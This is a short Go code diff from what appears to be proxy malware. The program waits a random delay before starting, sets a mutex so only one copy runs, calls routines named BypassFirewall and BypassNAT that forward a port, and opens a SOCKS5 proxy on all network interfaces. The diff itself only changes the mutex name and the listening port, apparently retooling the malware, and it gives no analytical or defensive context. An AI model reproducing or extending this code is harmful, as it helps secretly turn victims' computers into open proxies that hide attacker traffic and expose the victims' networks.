@@ -22,7 +22,7 @@ func main() {
 	seed, _ := crand.Int(crand.Reader, big.NewInt(math.MaxInt64))
 	rand.Seed(seed.Int64())
 	time.Sleep(time.Second * time.Duration(rand.Intn(10)+20))
-	if _, err := CreateMutex("wyvern2021"); err != nil {
+	if _, err := CreateMutex("iIIusi0n"); err != nil {
 		return
 	}
 	err := BypassFirewall()
@@ -79,7 +79,7 @@ func BypassNAT() {
 	if err != nil {
 		return
 	}
-	err = d.Forward(8001, "socks5")
+	err = d.Forward(8000, "socks5")
 	if err != nil {
 		return
 	}
@@ -138,7 +138,7 @@ func SocksServer(config Config, ch chan bool) {
 			continue
 		}
 
-		if err := server.ListenAndServe("tcp", "0.0.0.0:8001"); err != nil {
+		if err := server.ListenAndServe("tcp", "0.0.0.0:8000"); err != nil {
 			time.Sleep(time.Second * 10)
 			continue
 		}
